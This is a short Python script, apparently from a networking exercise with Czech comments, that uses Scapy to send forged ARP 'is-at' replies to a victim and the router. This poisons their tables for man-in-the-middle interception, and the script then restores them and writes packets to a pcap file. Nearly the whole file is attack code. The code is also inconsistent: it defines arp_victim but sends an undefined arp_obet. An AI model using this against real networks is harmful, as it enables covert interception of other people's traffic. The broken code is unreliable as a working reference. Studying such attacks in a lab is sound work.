# 1. TODO: Import Scapy (ARP, send, wrpcap)

# 2. TODO: Function spoof(target_ip, spoof_ip, target_mac)
#    - Create a fake ARP packet of type "is-at".
#    - Set psrc to the router's IP, but send it to the victim's MAC.

# 3. TODO: Function restore(target_ip, gateway_ip, target_mac, gateway_mac)
#    - Send correct ARP information to both the victim and the router.
#    - This will "heal" the network after you stop the program.

# 4. TODO: Function save_capture(packet_list, filename="capture.pcap")
#    - Use wrpcap() to save the captured data.
import time

from scapy.all import ARP, wrpcap
from scapy.all import send as s

from network_utils import router_ip, router_mac, target_ip, target_mac

# --- Config --- #
arp_victim = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
arp_router = ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)

arp_victim_restore = ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
arp_router_restore = ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)

packet_list = []

# --- Funkce --- #
def save_capture(packets, filename="capture.pcap"):
    if packets:
        wrpcap(filename, packets)
        print(f"Komunikace uložena do: {filename} ({len(packets)} paketů)")
    else:
        print("Žádné pakety k uložení.")


# --- Hlavní funkce --- #
def spoof():
    # Odeslání ARP paketů
    try:
        print(f"Posílám falešné ARP pakety: Ctrl+C pro ukončení.")
        while True:
            s(arp_obet, verbose=False)
            packet_list.append(arp_obet)

            s(arp_router, verbose=False)
            packet_list.append(arp_router)

            time.sleep(2)

    except KeyboardInterrupt:
        print("Ukončuji útok, vracím síť do normálu...")
        # Odeslání správných ARP paketů pro obnovení sítě
        s(arp_obet_restore, verbose=False, count=5)
        packet_list.append(arp_obet_restore)

        s(arp_router_restore, verbose=False, count=5)
        packet_list.append(arp_router_restore)

        print("Síť byla obnovena. Program ukončen.")

        # Uložení komunikace do .pcap souboru
        save_capture(packet_list)
#test

if __name__ == "__main__":
    spoof()
